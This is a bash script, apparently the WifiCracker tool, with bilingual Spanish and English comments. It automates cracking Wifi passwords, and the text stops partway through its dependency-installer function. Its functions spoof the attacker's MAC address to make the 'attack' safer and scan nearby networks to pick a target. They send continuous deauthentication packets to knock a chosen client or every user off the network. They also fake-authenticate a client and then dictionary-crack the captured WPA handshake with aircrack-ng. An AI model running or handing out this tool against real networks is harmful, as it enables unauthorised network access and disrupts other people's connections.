# Programa en bash hecho para averiguar la contraseña de un Wifi por medio de
# deautenticación de clientes conectados a la misma - (https://github.com/Marcelorvp/WifiCracker)

# Program made in bash that allows you to obtain Wifi's passwords through clients de-authentication
# connected to the network - (https://github.com/Marcelorvp/WifiCracker)

# Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra

#!/bin/bash

# ¡¡Debes de ejecutar el programa siendo superusuario!! [No hace falta estar conectado a
# ninguna red para ejecutar este programa]

# ¡¡You must run the program as root!! [Is not necessary to be connected at any network
# for running the program]


value=1
entrada=1
macchg=0
airng=0
xdt=0
nm=0
entradaPrincipal=0
typeUser=0
engOptions=0
spanOptions=0

#Private IP Adress [hostname -I | Particular stored values]
var1=$(hostname -I | cut -d "." -f 1)
var2=$(hostname -I | cut -d "." -f 2)
var3=$(hostname -I | cut -d "." -f 3)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

monitorMode(){

  #Tienes que ser root para ejecutar esta opción, de lo contrario no podrás

  #You must execute this option as root, otherwise you won't be able

  if [ "$spanOptions" = "1" ]; then
    if [ "$(id -u)" = "0" ]; then
      echo " "
      echo -e "$greenColour Abriendo configuración de interfaz...$endColour"
      echo " "
      sleep 2
      ifconfig
      echo " "
      echo -n -e "$yellowColour Indique su tarjeta de red Wifi (wlan0, wlp2s0...): $endColour"
      read tarjetaRed
      echo " "
      echo -e "$greenColour Iniciando modo monitor...$endColour"
      sleep 2

      if [ "$value" = "1" ]; then

        # Al habilitar el modo monitor, capturamos y escuchamos cualquier tipo de
        # paquete que viaje por el aire. También capturamos no sólo a aquellos clientes
        # que estén conectados a la red, también los no asociados a ninguna (con sus
        # respectivas direcciones MAC).

        # Enabling monitor mode, we can capture and hear any kind of package travelling
        # in the air. Also we capture not only those users connected to the network,
        # also not-associated clientes (with their respectives MAC addresses).

        airmon-ng start $tarjetaRed
        value=2
        echo " "
        echo -e "$greenColour Dando de baja la interfaz mon0$endColour"
        echo " "
        sleep 2
        ifconfig mon0 down
        echo -e "$greenColour Cambiando direccion MAC...$endColour"
        echo " "
        sleep 2

        # A continuación vamos a cambiar nuestra dirección MAC, esto lo haremos para
        # realizar el 'ataque' de manera más segura en modo monitor. Para ello, siempre
        # que queramos realizar algún cambio en una interfaz, primero tenemos que darla
        # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
        # nuevamente dada de alta.

        # Next we are going to change our MAC address, we will do it for doing a safe
        # 'attack' on monitor mode. Whenever we want to make a change in an interface, first
        # we have to disable it. Later, when making changes ... this will have to be re-released.

        macchanger -a mon0
        echo " "
        echo -e "$greenColour Dando de alta la interfaz mon0$endColour"
        echo " "
        sleep 2
        ifconfig mon0 up
        value=2
        echo -e "$blueColour ¡Terminado!$endColour"
        echo " "
        echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
        read

        # Si quisiéramos comprobar que nuestra dirección MAC ha sido cambiada, podemos
        # hacer uso del comando 'macchanger -s mon0'. Esta nos mostrará 2 direcciones MAC,
        # una de ellas es la 'New MAC' que corresponde a la que el programa 'macchanger' nos
        # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
        # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
        # que teníamos desde un principio.

        # If we wanted to see if our MAC address has been changed, we can use 'macchanger -s mon0'.
        # This show us 2 MAC addresses, first is 'New MAC' corresponding to the random MAC program itself offers.
        # Second is 'Permanent MAC', corresponding to our real MAC adress, it will be refunded once we finish the process.

      else
        echo " "
        echo -e "$redColour No es posible, ya estás en modo monitor$endColour"
        echo " "
        echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
        read
      fi
    elif [ "$(id -u)" != "0" ]; then
      echo " "
      echo -e "$redColour Esto debe ser ejecutado como root$endColour"
      echo " "
      exit 1
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    if [ "$(id -u)" = "0" ]; then
      echo " "
      echo -e "$greenColour Opening Interface Settings...$endColour"
      echo " "
      sleep 2
      ifconfig
      echo " "
      echo -n -e "$yellowColour Enter your Wifi network card (wlan0, wlp2s0, ...): $endColour"
      read tarjetaRed
      echo " "
      echo -e "$greenColour Starting monitor mode...$endColour"
      sleep 2

      if [ "$value" = "1" ]; then

        # Al habilitar el modo monitor, capturamos y escuchamos cualquier tipo de
        # paquete que viaje por el aire. También capturamos no sólo a aquellos clientes
        # que estén conectados a la red, también los no asociados a ninguna (con sus
        # respectivas direcciones MAC).

        # Enabling monitor mode, we can capture and hear any kind of package travelling
        # in the air. Also we capture not only those users connected to the network,
        # also not-associated clientes (with their respectives MAC addresses).

        airmon-ng start $tarjetaRed
        value=2
        echo " "
        echo -e "$greenColour Disabling 'mon0' interface$endColour"
        echo " "
        sleep 2
        ifconfig mon0 down
        echo -e "$greenColour Changing MAC Address...$endColour"
        echo " "
        sleep 2

        # A continuación vamos a cambiar nuestra dirección MAC, esto lo haremos para
        # realizar el 'ataque' de manera más segura en modo monitor. Para ello, siempre
        # que queramos realizar algún cambio en una interfaz, primero tenemos que darla
        # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
        # nuevamente dada de alta.

        # Next we are going to change our MAC address, we will do it for doing a safe
        # 'attack' on monitor mode. Whenever we want to make a change in an interface, first
        # we have to disable it. Later, when making changes ... this will have to be re-released.

        macchanger -a mon0
        echo " "
        echo -e "$greenColour Enabling 'mon0' interface$endColour"
        echo " "
        sleep 2
        ifconfig mon0 up
        value=2
        echo -e "$blueColour Finished!$endColour"
        echo " "
        echo -e "$redColour Press <Enter> to return to the main menu$endColour"
        read

        # Si quisiéramos comprobar que nuestra dirección MAC ha sido cambiada, podemos
        # hacer uso del comando 'macchanger -s mon0'. Esta nos mostrará 2 direcciones MAC,
        # una de ellas es la 'New MAC' que corresponde a la que el programa 'macchanger' nos
        # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
        # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
        # que teníamos desde un principio.

        # If we wanted to see if our MAC address has been changed, we can use 'macchanger -s mon0'.
        # This show us 2 MAC addresses, first is 'New MAC' corresponding to the random MAC program itself offers.
        # Second is 'Permanent MAC', corresponding to our real MAC adress, it will be refunded once we finish the process.

      else
        echo " "
        echo -e "$redColour Not possible, you are already in monitor mode$endColour"
        echo " "
        echo -e "$redColour Press <Enter> to return to the main menu$endColour"
        read
      fi
    elif [ "$(id -u)" != "0" ]; then
      echo " "
      echo -e "$redColour This must be executed as superuser$endColour"
      echo " "
      exit 1
    fi
  fi
}

interfacesMode(){

  # Si ya ha has iniciado el modo monitor, verás que ahora en vez de tener 3 interfaces,
  # tienes 4, una de ellas siendo la 'mon0' correspondiente al modo monitor. Cuando la des
  # de baja o realices algún cambio, esta opción te permitirá ver qué está ocurriendo con las
  # interfaces.

  # If you have already started the monitor mode, you will see that now instead of having 3 interfaces,
  # you have 4, and one of them being 'mon0', corresponding to monitor mode. When desabling or enabling,
  # this option will show you what is happening on interfaces.

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Abriendo configuración de interfaz...$endColour"
    echo " "
    echo -e "$blueColour 'mon0' corresponderá a la nueva interfaz creada, encargada de escanear las redes WiFi disponibles...$endColour"
    echo " "
    sleep 4
    ifconfig
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Opening Interface Settings...$endColour"
    echo " "
    echo -e "$blueColour 'mon0' will correspond to the new interface created, responsible for scanning the available WiFi networks...$endColour"
    echo " "
    sleep 4
    ifconfig
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu$endColour"
    read
  fi

}

monitorDown(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Eliminando modo monitor...$endColour"
    echo " "
    sleep 2
    if [ "$value" = "2" ]; then

      # Con este comando detienes por completo el modo monitor. Siempre que quieras
      # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
      # a través de la opción 1.

      # With this command, you stop the monitor mode. Whenever you want to use it
      # again once stopped... you'll have to create it again through option 1

      airmon-ng stop mon0
      echo " "
      echo -e "$blueColour Interfaz mon0 eliminada con éxito$endColour"
      echo " "
      value=1
      echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
      read
    else
      echo -e "$blueColour No hay interfaz mon0, tienes que iniciarla con la opción 1$endColour"
      echo " "
      echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
      read
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Deleting monitor mode...$endColour"
    echo " "
    sleep 2
    if [ "$value" = "2" ]; then

      # Con este comando detienes por completo el modo monitor. Siempre que quieras
      # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
      # a través de la opción 1.

      # With this command, you stop the monitor mode. Whenever you want to use it
      # again once stopped... you'll have to create it again through option 1

      airmon-ng stop mon0
      echo " "
      echo -e "$blueColour 'mon0' interface successfully deleted$endColour"
      echo " "
      value=1
      echo -e "$redColour Press <Enter> to return to main menu$endColour"
      read
    else
      echo -e "$blueColour There is no mon0 interface, you have to start it with option 1$endColour"
      echo " "
      echo -e "$redColour Press <Enter> to return to main menu$endColour"
      read
    fi
  fi
}

wifiScanner(){

  if [ "$spanOptions" = "1" ]; then
    if [ "$value" = "2" ]; then
      echo " "
      echo -e "$greenColour Van a escanearse las redes Wifis cercanas...$endColour"
      echo " "
      echo -e "$greenColour Una vez carguen más o menos todas las redes, presiona Ctrl+C$endColour"
      sleep 4

      # 'airodump-ng' nos permite analizar las redes disponibles a través de una
      # interfaz que le especifiquemos, en nuestro caso 'mon0'. Podría resultar
      # más simple hacer 'airodump-ng wlp2s0' con la propia tarjeta de red
      # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
      # te avisará de que es necesario inicializar el modo monitor, de lo contrario
      # no te será permitido el escaneo de redes.

      # 'airodump-ng' allows us to analyze the available networks via an specific interface,
      # in our case... 'mon0'. It might be simpler to do 'airodump-ng wlp2s0' with our
      # own network card and access the scanning wireless networks ... but the program itself
      # will warn you it's necessary to initialize monitor mode, otherwise... you will not be
      # allowed to network scanning

      airodump-ng mon0
      echo " "
      echo -n -e "$yellowColour Red Wifi (ESSID) que quiere marcar como objetivo: $endColour"
      read wifiName
      echo " "
      echo -n -e "$yellowColour Marque el canal (CH) en el que se encuentra: $endColour"
      read channelWifi
      echo " "
      echo -n -e "$yellowColour Nombre que desea ponerle a la carpeta: $endColour"
      read folderName
      echo " "
      echo -n -e "$yellowColour Nombre que desea ponerle al archivo: $endColour"
      read archiveName
      echo " "
      echo -n -e "$yellowColour Escribe tu nombre de usuario del sistema: $endColour"
      read userSystem
      echo " "
      echo -e "$greenColour Se va a crear una carpeta en el escritorio, esta contendrá toda la información de la red Wifi seleccionada$endColour"
      echo " "
      sleep 4
      mkdir /home/$userSystem/Escritorio/$folderName
      cd /home/$userSystem/Escritorio/$folderName
      echo -e "$greenColour A continuación vamos a ver la actividad sólo en $wifiName $endColour "
      echo " "
      echo -e "$greenColour Abra otra terminal, y dejando en ejecución este proceso ejecute la opción 5$endColour"
      echo " "
      sleep 7

      # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
      # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
      # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.

      # The following command can also be use by the following syntax: airodump-ng -c '' -w '' --bssid '$ wifiMAC' mon0
      # 'essid' corresponding to the Wifi's name and 'bssid' to his MAC adress. What we are doing with this is focussing
      # on a unique network especified by parameters, isolating the other networks.

      airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0

    else
      echo " "
      echo -e "$redColour Inicia el modo monitor primero$endColour"
      echo " "
      echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
      read
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    if [ "$value" = "2" ]; then
      echo " "
      echo -e "$greenColour Nearby wifis networks are going to be scanned ...$endColour"
      echo " "
      echo -e "$greenColour Once more or less all networks are loaded, press Ctrl + C$endColour"
      sleep 4

      # 'airodump-ng' nos permite analizar las redes disponibles a través de una
      # interfaz que le especifiquemos, en nuestro caso 'mon0'. Podría resultar
      # más simple hacer 'airodump-ng wlp2s0' con la propia tarjeta de red
      # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
      # te avisará de que es necesario inicializar el modo monitor, de lo contrario
      # no te será permitido el escaneo de redes.

      # 'airodump-ng' allows us to analyze the available networks via an specific interface,
      # in our case... 'mon0'. It might be simpler to do 'airodump-ng wlp2s0' with our
      # own network card and access the scanning wireless networks ... but the program itself
      # will warn you it's necessary to initialize monitor mode, otherwise... you will not be
      # allowed to network scanning

      airodump-ng mon0
      echo " "
      echo -n -e "$yellowColour Red Wifi (ESSID) that wants to target: $endColour"
      read wifiName
      echo " "
      echo -n -e "$yellowColour Dial the channel (CH) network is: $endColour"
      read channelWifi
      echo " "
      echo -n -e "$yellowColour Folder name: $endColour"
      read folderName
      echo " "
      echo -n -e "$yellowColour File name: $endColour"
      read archiveName
      echo " "
      echo -n -e "$yellowColour Enter your system username: $endColour"
      read userSystem
      echo " "
      echo -e "$greenColour A folder will be created on the desktop, it will contain all the information of the selected Wifi network$endColour"
      echo " "
      sleep 4
      mkdir /home/$userSystem/Escritorio/$folderName
      cd /home/$userSystem/Escritorio/$folderName
      echo -e "$greenColour Now we will see the activity only in $wifiName $endColour "
      echo " "
      echo -e "$greenColour Open another terminal, and leaving in execution this process execute option 5$endColour"
      echo " "
      sleep 7

      # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
      # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
      # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.

      # The following command can also be use by the following syntax: airodump-ng -c '' -w '' --bssid '$ wifiMAC' mon0
      # 'essid' corresponding to the Wifi's name and 'bssid' to his MAC adress. What we are doing with this is focussing
      # on a unique network especified by parameters, isolating the other networks.

      airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0

    else
      echo " "
      echo -e "$redColour Start monitor mode first$endColour"
      echo " "
      echo -e "$redColour Press <Enter> to return to main menu$endColour"
      read
    fi
  fi

}

wifiPassword(){

  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
  # por fines prácticos nos será de utilidad verlo de esta forma)

  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)
  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$redColour Esta opción sólo deberías ejecutarla si ya has hecho los pasos 1, 4 y 5... de lo contrario no obtendrás nada$endColour"
    sleep 3
    echo " "
    echo -n -e "$yellowColour Nombre del diccionario (póngalo en el escritorio, con extensión correspondiente): $endColour"
    read dictionaryName
    echo " "
    echo -n -e "$yellowColour Nombre de la carpeta creada en el paso 4: $endColour"
    read folderName
    echo " "
    echo -n -e "$yellowColour Nombre del archivo creado en el paso 4 (Con extensión correspondiente '.cap'): $endColour"
    read archiveName
    echo " "
    echo -n -e "$yellowColour Escribe tu nombre de usuario del sistema: $endColour"
    read userSystem
    echo " "
    echo -e "$greenColour Vamos a proceder a averiguar la contraseña$endColour"
    echo " "
    sleep 5

    # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
    # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
    # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
    # carpeta de manera manual, puede que el nombre tenga ligeros cambios.

    # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
    # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
    # to the name again inside the folder, the name may have slight changes.

    aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
    sleep 10
  fi

  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
  # por fines prácticos nos será de utilidad verlo de esta forma)

  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)
  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$redColour This option should only be executed if you have already done steps 1, 4 and 5 ... otherwise you will not get anything$endColour"
    sleep 3
    echo " "
    echo -n -e "$yellowColour Name of the dictionary (put it on the desktop, with corresponding extension): $endColour"
    read dictionaryName
    echo " "
    echo -n -e "$yellowColour Name of the folder created in step 4: $endColour"
    read folderName
    echo " "
    echo -n -e "$yellowColour Name of the file created in step 4 (with corresponding extension '.cap'): $endColour"
    read archiveName
    echo " "
    echo -n -e "$yellowColour Enter your system username: $endColour"
    read userSystem
    echo " "
    echo -e "$greenColour Let's proceed to find out the password...$endColour"
    echo " "
    sleep 5

    # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
    # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
    # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
    # carpeta de manera manual, puede que el nombre tenga ligeros cambios.

    # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
    # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
    # to the name again inside the folder, the name may have slight changes.

    aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
    sleep 10
  fi

}

resetProgram(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$redColour Esta opción deberías escogerla en caso de haber ya estado usando las anteriores$endColour"
    sleep 4
    echo " "
    echo -e "$greenColour Dando de baja el modo monitor...$endColour"
    sleep 3
    airmon-ng stop mon0
    value=1
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$redColour You should choose this option in case you have already been using the previous ones$endColour"
    sleep 4
    echo " "
    echo -e "$greenColour Disabling monitor mode...$endColour"
    sleep 3
    airmon-ng stop mon0
    value=1
  fi

}

macAttack(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -n -e "$yellowColour Introduzca nombre del Wifi (ESSID): $endColour"
    read wifiName
    echo " "
    echo -n -e "$yellowColour Escriba la dirección MAC del usuario al que desea deautenticar (STATION): $endColour"
    read macClient
    echo " "
    echo -e "$greenColour Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada$endColour"
    echo " "
    echo -e "$greenColour Es recomendable esperar 1 minuto$endColour"
    echo " "
    echo -e "$greenColour Cuando el minuto haya pasado, presione Ctrl+C para parar el proceso y desde una nueva terminal escoga la opción 7 $endColour"
    echo " "
    sleep 13

    # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
    # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
    # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
    # MAC la siguiente -> FF:FF:FF:FF:FF:FF

    # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
    # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
    # MAC address -> FF:FF:FF:FF:FF:FF

    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0

    # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
    # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

    # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
    read wifiName
    echo " "
    echo -n -e "$yellowColour Enter the MAC address of the user you want to deauthenticate (STATION): $endColour"
    read macClient
    echo " "
    echo -e "$greenColour We proceed to send deauthentication packets to the specified MAC address$endColour"
    echo " "
    echo -e "$greenColour It is advisable to wait 1 minute$endColour"
    echo " "
    echo -e "$greenColour When the minute has passed, press Ctrl + C to stop the process and from a new terminal choose option 7$endColour"
    echo " "
    sleep 13

    # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
    # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
    # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
    # MAC la siguiente -> FF:FF:FF:FF:FF:FF

    # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
    # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
    # MAC address -> FF:FF:FF:FF:FF:FF

    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0

    # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
    # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

    # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
  fi

}

# Escoge esta opción sólo si no hay clientes conectados a la red

# Choose this option only if there are no clients connected to the network

fakeAuth(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Vamos a proceder a autenticar un falso cliente en la red, desde la Terminal 1 podrás ver cómo este es añadido$endColour"
    echo " "
    echo -e "$greenColour Posteriormente, selecciona la opción 5 para mandar paquetes de deautenticación a dicho cliente$endColour"
    echo " "
    sleep 5
    echo -n -e "$yellowColour Escribe una dirección MAC (Puedes usar a clientes no asociados o tu propia dirección MAC [La nueva]): $endColour"
    read fakeMAC
    echo " "
    echo -n -e "$yellowColour Escribe el nombre del Wifi (ESSID): $endColour"
    read wifiName
    echo " "
    echo -e "$greenColour Procedemos...$endColour"
    echo " "
    sleep 3
    aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour We will proceed to authenticate a false client in the network, from Terminal 1 you will see how this is added$endColour"
    echo " "
    echo -e "$greenColour Subsequently, select option 5 to send deauthentication packets to that client$endColour"
    echo " "
    sleep 5
    echo -n -e "$yellowColour Enter a MAC address (You can use non-associated clients or your own [new] MAC address): $endColour"
    read fakeMAC
    echo " "
    echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
    read wifiName
    echo " "
    echo -e "$greenColour We proceed...$endColour"
    echo " "
    sleep 3
    aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0
  fi

}

necessaryPrograms(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Vamos a ver qué programas tienes instalados y cuáles te faltan..$endColour."
    sleep 3

    if [ ! -x /usr/bin/aircrack-ng ];then

      echo " "
    	echo -e "$blueColour Aircrack-ng:$endColour$redColour No Instalado$endColour"
      airng=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Aircrack-ng:$endColour$greenColour Instalado$endColour"
      airng=0
    	sleep 0.4
    fi

    if [ ! -x /usr/bin/macchanger ];then

      echo " "
    	echo -e "$blueColour Macchanger:$endColour$redColour No Instalado$endColour"
      macchg=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Macchanger:$endColour$greenColour Instalado$endColour"
      macchg=0
    	sleep 0.4
    fi

    if [ ! -x /usr/bin/xdotool ];then

      echo " "
    	echo -e "$blueColour Xdotool:$endColour$redColour No Instalado$endColour"
      xdt=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Xdotool:$endColour$greenColour Instalado$endColour"
      xdt=0
    	sleep 1
    fi

    if [ ! -x /usr/bin/nmap ];then

      echo " "
    	echo -e "$blueColour Nmap:$endColour$redColour No Instalado$endColour"
      nm=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Nmap:$endColour$greenColour Instalado$endColour"
      nm=0
    	sleep 1
    fi

    if [ "$airng" = "0" ] && [ "$macchg" = "0" ] && [ "$xdt" = "0" ] && [ "$nm" = "0" ]; then
      echo " "
      echo -e "$greenColour Tienes todos los programas necesarios...$endColour"
      echo " "
      echo -e "$redColour Presione <Enter> para continuar$endColour"
      read
    fi

    if [ "$airng" = "1" ]; then
      echo " "
      echo -e "$greenColour Se va a instalar 'aircrack-ng' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
      echo -n "-> "
      read respuestaA

      case $respuestaA in

        Si | s | S | si ) echo " "
             echo -e "$greenColour Comenzando la instalación...$endColour"
             echo " "
             sleep 2
             sudo apt-get install aircrack-ng
             echo " "
             echo -e "$blueColour¡Instalación Terminada!$endColour"
             echo " "
             echo -e "$redColour Presione <Enter> para continuar$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Instalación de 'aircrack-ng' cancelada...$endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$macchg" = "1" ]; then
      echo " "
      echo -e "$greenColour Se va a instalar 'macchanger' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaB

      case $respuestaB in

        Si | s | S | si ) echo " "
             echo -e "$greenColour Comenzando la instalación...$endColour"
             echo " "
             sleep 2
             sudo apt-get install macchanger
             echo " "
             echo -e "$blueColour¡Instalación Terminada!$endColour"
             echo " "
             echo -e "$redColour Presione <Enter> para continuar$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Instalación de 'macchanger' cancelada... $endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$xdt" = "1" ]; then

      echo " "
      echo -e "$greenColour Se va a instalar 'xdotool' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaC

      case $respuestaC in

        Si | s | S | si) echo " "
             echo -e "$greenColour Comenzando la instalación...$endColour"
             echo " "
             sleep 2
             sudo apt-get install xdotool
             echo " "
             echo -e "$blueColour¡Instalación Terminada!$endColour"
             echo " "
             echo -e "$redColour Presione <Enter> para continuar$endColour"
             read
             ;;

        No | n | no | No) echo " "
             echo -e "$redColour Instalación de 'xdotool' cancelada... $endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$nm" = "1" ]; then
      echo " "
      echo -e "$greenColour Se va a instalar 'Nmap' en tu ordenador, ¿quiere continuar?$endColour $blueColour(Si/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaD

      case $respuestaD in

        Si | s | S | si ) echo " "
             echo -e "$greenColour Comenzando la instalación...$endColour"
             echo " "
             sleep 2
             sudo apt-get install nmap
             echo " "
             echo -e "$blueColour¡Instalación Terminada!$endColour"
             echo " "
             echo -e "$redColour Presione <Enter> para continuar$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Instalación de 'Nmap' cancelada... $endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Let's see what programs you have installed and which ones are missing...$endColour."
    sleep 3

    if [ ! -x /usr/bin/aircrack-ng ];then

      echo " "
    	echo -e "$blueColour Aircrack-ng:$endColour$redColour Noy installed$endColour"
      airng=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Aircrack-ng:$endColour$greenColour Installed$endColour"
      airng=0
    	sleep 0.4
    fi

    if [ ! -x /usr/bin/macchanger ];then

      echo " "
    	echo -e "$blueColour Macchanger:$endColour$redColour Not installed$endColour"
      macchg=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Macchanger:$endColour$greenColour Installed$endColour"
      macchg=0
    	sleep 0.4
    fi

    if [ ! -x /usr/bin/xdotool ];then

      echo " "
    	echo -e "$blueColour Xdotool:$endColour$redColour Not installed$endColour"
      xdt=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Xdotool:$endColour$greenColour Installed$endColour"
      xdt=0
    	sleep 1
    fi

    if [ ! -x /usr/bin/nmap ];then

      echo " "
    	echo -e "$blueColour Nmap:$endColour$redColour Not installed$endColour"
      nm=1
    	sleep 0.4

    else
    	echo " "
    	echo -e "$blueColour Nmap:$endColour$greenColour Installed$endColour"
      nm=0
    	sleep 1
    fi

    if [ "$airng" = "0" ] && [ "$macchg" = "0" ] && [ "$xdt" = "0" ] && [ "$nm" = "0" ]; then
      echo " "
      echo -e "$greenColour You have all the necessary programs...$endColour"
      echo " "
      echo -e "$redColour Press <Enter> to continue$endColour"
      read
    fi

    if [ "$airng" = "1" ]; then
      echo " "
      echo -e "$greenColour 'aircrack-ng' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
      echo -n "-> "
      read respuestaA

      case $respuestaA in

